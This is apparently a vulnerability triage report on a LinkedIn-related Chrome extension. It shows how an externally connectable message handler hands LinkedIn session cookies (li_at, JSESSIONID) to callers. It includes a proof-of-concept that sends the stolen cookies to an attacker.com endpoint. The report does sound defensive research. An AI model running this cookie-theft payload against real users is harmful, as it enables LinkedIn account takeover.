# CoCo Analysis: dbpiijgjfgnelhkmnklfebcnhdlecodc

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 13 (10 cookies_source flows + 2 storage_sync_set + 1 storage_sync_clear)

---

## Sink 1-10: cookies_source → sendResponseExternal_sink

**CoCo Trace:**
CoCo detected multiple flows from cookies_source to sendResponseExternal_sink at lines 684-697 in bg.js. However, these lines are in CoCo's framework code (mock implementation of chrome.cookies.getAll), not the actual extension code.

**Analysis:** The actual vulnerability is in the extension's original code starting at line 963.

**Code:**

```javascript
// Background script - bg.js Line 1031
chrome.runtime.onMessageExternal.addListener(function (
    request,
    sender,
    sendResponse
) {
    if (request) {
        if (request.message) {
            if (request.message == "version") {
                // checking if extension is installed
                sendResponse({version: 1.0})
            }

            if (request.message == "establish_connection" && request.token) {
                // connecting with Relatable
                getLinkedInCookies(null, request.token, true, function (liCookie) {
                    if (liCookie) {
                        sendResponse({
                            token: request.token,  // ← attacker-controlled token
                            cookie: liCookie  // ← LinkedIn cookies sent back to external caller
                        })
                        chrome.storage.sync.set({li_cookie: liCookie})
                    } else {
                        sendResponse({token: request.token, cookie: null})
                    }

                    chrome.storage.sync.set({li_rel: request.token})  // ← Storage poisoning
                })
            }

            if (request.message == "terminate_connection") {
                // disconnecting with Relatable
                sendResponse({status: "extension storage was cleared"})
                chrome.storage.sync.clear()
            }
        }
    }
    return true
})

// Line 1106
function getLinkedInCookies(savedLiCookie, relCookie, fastResponse, cb) {
    chrome.cookies.getAll({url: "https://www.linkedin.com"}, function (cookie) {
        if (cookie) {
            const liCookieMapped = cookie.filter((c) => ["li_at", "JSESSIONID"].includes(c.name))
            // ↑ Extracts LinkedIn authentication cookies

            let liCookieNeedsUpdate = true
            if (savedLiCookie && savedLiCookie.length > 0) {
                const cookieString = liCookieMapped.map((k) => k.value).join('')
                liCookieNeedsUpdate = (cookieString !== savedLiCookie.map((k) => k.value).join(''))
            } else {
                liCookieNeedsUpdate = true
            }

            chrome.storage.local.set({li_cookie: liCookieMapped})

            if (fastResponse) {
                cb(liCookieMapped)  // ← Cookies passed back to callback (flows to sendResponse)
            } else if (liCookieNeedsUpdate) {
                sendLinkedinCookieToRelatable(relCookie, liCookieMapped, cb)
            }
        } else {
            cb(null)
        }
    })
}

// Line 1069 - Also sends to hardcoded backend (separate from the vulnerability)
function sendLinkedinCookieToRelatable(relToken, liCookieMapped, callback) {
    const url = `${getApiUrl()}/linkedin/daily_sync`
    // getApiUrl() returns hardcoded URLs: api.relatable.one, staging, or localhost

    const userLoggedIn = liCookieMapped.some((c) => c.name === "li_at")

    const options = {
        method: "POST",
        headers: {
            Accept: "application/json",
            "Content-Type": "application/json;charset=UTF-8",
        },
        body: JSON.stringify({
            account_state: userLoggedIn ? "running" : "missing_token",
            cookie: liCookieMapped,  // ← Also sent to developer's backend (trusted infrastructure)
            token: relToken,
        }),
    }
    fetch(url, options)
        .then((response) => response.json())
        .then((data) => {
            if (userLoggedIn) {
                callback(liCookieMapped)
            }
        }).catch((error) => {
        console.log(error)
    })
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** chrome.runtime.onMessageExternal (externally_connectable domains: localhost, staging.relatable.one, www.relatable.one)

**Attack:**

```javascript
// Malicious code on one of the whitelisted domains (e.g., www.relatable.one if compromised)
// Or malicious localhost server if user is running one

chrome.runtime.sendMessage(
  'dbpiijgjfgnelhkmnklfebcnhdlecodc',  // Extension ID
  {
    message: "establish_connection",
    token: "attacker_controlled_token"
  },
  function(response) {
    console.log("Stolen LinkedIn cookies:", response.cookie);
    // response.cookie contains li_at and JSESSIONID cookies

    // Exfiltrate to attacker server
    fetch("https://attacker.com/steal", {
      method: "POST",
      body: JSON.stringify({
        cookies: response.cookie,
        token: response.token
      })
    });
  }
);
```

**Impact:** Information disclosure - An attacker with access to one of the whitelisted domains (localhost, staging.relatable.one, or www.relatable.one) can steal LinkedIn authentication cookies (li_at and JSESSIONID). These cookies can be used to:
1. Impersonate the user on LinkedIn
2. Access the user's LinkedIn account and data
3. Perform actions on behalf of the user

The vulnerability requires either:
- Compromise of relatable.one domains (staging or production)
- XSS vulnerability on relatable.one domains
- Malicious localhost server (if user is running one)

---

## Sink 11-12: bg_chrome_runtime_MessageExternal → chrome_storage_sync_set_sink

**CoCo Trace:**
Line 1043: `if (request.message == "establish_connection" && request.token)`
Line 1055: `chrome.storage.sync.set({li_rel: request.token})`

**Code:** (Already shown in Sink 1-10 analysis above)

**Classification:** FALSE POSITIVE

**Reason:** This is storage poisoning without a complete retrieval path to the attacker. While the attacker-controlled token is stored in chrome.storage.sync, the stored token is only used internally by the extension to send data to the hardcoded backend URL (relatable.one API), which is trusted infrastructure. There is no path where the stored token flows back to the attacker through sendResponse, postMessage, or attacker-controlled URLs.

---

## Sink 13: chrome_storage_sync_clear_sink

**CoCo Trace:**
Line 1062: `chrome.storage.sync.clear()`

**Classification:** FALSE POSITIVE

**Reason:** The storage.clear() operation is triggered by the "terminate_connection" message but does not represent a vulnerability. Clearing storage is not an exploitable operation - it's a denial of service at worst, and in this case, it's an intentional feature to disconnect the extension from the Relatable service.

---

## Overall Assessment Explanation

Extension dbpiijgjfgnelhkmnklfebcnhdlecodc has **ONE TRUE POSITIVE vulnerability** (LinkedIn cookie exfiltration) and **multiple FALSE POSITIVE detections** (storage operations).

The TRUE POSITIVE allows an attacker with access to whitelisted domains (localhost, staging.relatable.one, or www.relatable.one) to exfiltrate LinkedIn authentication cookies via sendResponseExternal. This represents a serious information disclosure vulnerability that could lead to account compromise.

The FALSE POSITIVES relate to:
1. CoCo detecting framework/mock code instead of actual extension code for the cookie flows
2. Storage poisoning without retrieval paths back to the attacker
3. Storage clear operation which is not exploitable

Note: While the extension also sends cookies to hardcoded backend URLs (relatable.one API), this is considered trusted infrastructure according to the methodology and is not classified as a vulnerability.

According to the methodology, we ignore externally_connectable restrictions when analyzing onMessageExternal - even though only specific domains can trigger this, it's still classified as TRUE POSITIVE because an attacker with access to those domains can exploit it.
